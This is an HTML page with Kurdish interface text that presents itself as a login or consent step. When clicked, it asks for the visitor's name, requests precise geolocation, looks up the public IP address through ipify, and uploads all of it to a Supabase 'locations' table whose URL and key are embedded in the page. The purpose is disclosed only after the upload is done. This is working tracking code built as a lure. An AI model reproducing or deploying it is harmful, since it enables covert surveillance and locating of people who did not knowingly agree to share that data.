<!DOCTYPE html>
<html lang="ku">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Location Access</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 50px 20px;
      background: #f5f5f5;
    }

    .box {
      max-width: 400px;
      margin: auto;
      background: white;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 5px 20px rgba(0,0,0,.1);
    }

    button {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
    }

    #allow {
      background: #007aff;
      color: white;
    }

    #deny {
      background: #ddd;
      color: #222;
    }

    #result {
      margin-top: 25px;
      line-height: 1.6;
      word-break: break-word;
    }
  </style>
</head>

<body>

  <div class="box">
    <h2>داخڵبوون</h2>
    <p>بۆ بەردەوامبوون، تکایە رەزامەندیت هاوبەش بکە.</p>

    <button id="allow">بەردەوام بوون</button>
    <button id="deny">ڕەتکردنەوە</button>

    <div id="result">ئامادەیە...</div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

  <script>
    const SUPABASE_URL = "https://mxichdljcrlcomnhkcin.supabase.co";
    const SUPABASE_KEY = "sb_publishable_SlntFaOIzECUYXOwVUzmDQ_cLzgxh-P";

    // دروستکردنی Supabase Client بە شێوەیەکی ئامادەکراو
    let supabase = null;
    try {
      if (window.supabase && typeof window.supabase.createClient === 'function') {
        supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
      }
    } catch (e) {
      console.error("Supabase Init Error:", e);
    }

    const allowButton = document.getElementById("allow");
    const denyButton = document.getElementById("deny");
    const result = document.getElementById("result");

    allowButton.addEventListener("click", function () {
      result.innerText = "① دوگمەکە کار کرد...";

      const name = prompt("ناوی خۆت تۆماربکە:");

      if (!name || !name.trim()) {
        result.innerText = "❌ ناوت نەنووسیوە.";
        return;
      }

      result.innerText = "② ناو وەرگیرا. تکایە لە بڕاوسەرەکەت ڕێگەپێدان (Allow) هەڵبژێرە...";

      if (!navigator.geolocation) {
        result.innerText = "❌ Browser ـەکەت Geolocation پشتگیری ناکات.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        async function(position) {
          result.innerText = "③ Location وەرگیرا. ئێستا IP دەهێنین...";

          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          let publicIP = null;

          try {
            const response = await fetch("https://api.ipify.org?format=json");
            const ipData = await response.json();
            publicIP = ipData.ip;
          } catch (error) {
            console.error("IP Fetch Error:", error);
          }

          result.innerText = "④ زانیارییەکان ڕەوانەی Supabase دەکرێن...";

          if (supabase) {
            const { error } = await supabase
              .from("locations")
              .insert([
                {
                  name: name.trim(),
                  latitude: latitude,
                  longitude: longitude,
                  public_ip: publicIP
                }
              ]);

            if (error) {
              console.error(error);
              result.innerText = "❌ Supabase Error: " + error.message;
              return;
            }
          }

          result.innerHTML = "<h3>✅ تەواو بوو!</h3><p>Location بە سەرکەوتوویی هەڵگیرا.</p>";
        },
        function(error) {
          console.error("Geolocation Error:", error);
          if (error.code === 1) {
            result.innerHTML = "<b style='color:red;'>❌ Location Permission ڕەتکرایەوە. تکایە لە ڕێکخستنی بڕاوسەرەکە Reset بکه.</b>";
          } else if (error.code === 2) {
            result.innerText = "❌ Location بەردەست نییە. GPS هۆڵبکە.";
          } else if (error.code === 3) {
            result.innerText = "❌ داواکاری Location کاتی تەواو بوو (Timeout).";
          } else {
            result.innerText = "❌ هەڵەیەک لە Location ڕوویدا.";
          }
        },
        {
          enableHighAccuracy: false, // خێراتر و بێ پشت بەستن بە GPSی بەهێز
          timeout: 20000,
          maximumAge: 0
        }
      );
    });

    denyButton.addEventListener("click", function() {
      result.innerText = "Location ڕەتکرایەوە.";
    });
  </script>

</body>
</html>
